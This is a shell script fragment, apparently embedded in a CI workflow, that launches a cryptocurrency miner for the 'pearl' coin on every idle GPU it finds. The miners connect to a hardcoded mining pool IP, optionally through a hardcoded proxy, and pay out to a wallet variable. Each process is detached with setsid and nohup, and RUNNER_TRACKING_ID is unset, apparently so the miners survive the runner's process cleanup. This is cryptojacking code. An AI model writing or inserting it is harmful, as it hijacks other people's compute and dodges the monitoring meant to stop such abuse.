              WORKER="i130amdsrb2${SH}g${IDX}"
              LOG="$W/logs/krig_g${IDX}.log"
              if [ "$MODE" = "proxy" ]; then
                setsid env -u RUNNER_TRACKING_ID nohup "$KRIG" --coin pearl --url stratum+tcp://103.199.106.122:3362 --proxy http://178.238.228.181:80 --user "$WALLET/$WORKER" --password x --no-cuda --no-intel --no-telemetry --no-tui --devices-pci "$BDF" --log-level debug --log-file "$LOG" > "$W/logs/krig_stdout_g${IDX}.log" 2>&1 < /dev/null &
              else
                setsid env -u RUNNER_TRACKING_ID nohup "$KRIG" --coin pearl --url "$CHOSEN_URL" --user "$WALLET/$WORKER" --password x --no-cuda --no-intel --no-telemetry --no-tui --devices-pci "$BDF" --log-level debug --log-file "$LOG" > "$W/logs/krig_stdout_g${IDX}.log" 2>&1 < /dev/null &
              fi
              echo "launched idx=$IDX bdf=$BDF pid=$! worker=$WORKER mode=$MODE url=$CHOSEN_URL"
              LAUNCH=$((LAUNCH+1))
              sleep 1
            done < "$W/logs/idle_bdfs.txt"
          else
            echo "NO_LAUNCH mode=$MODE amd_n=${KRIG_AMD_N:-0} idle=$IDLE_N"
          fi
          echo "launch_count=$LAUNCH"
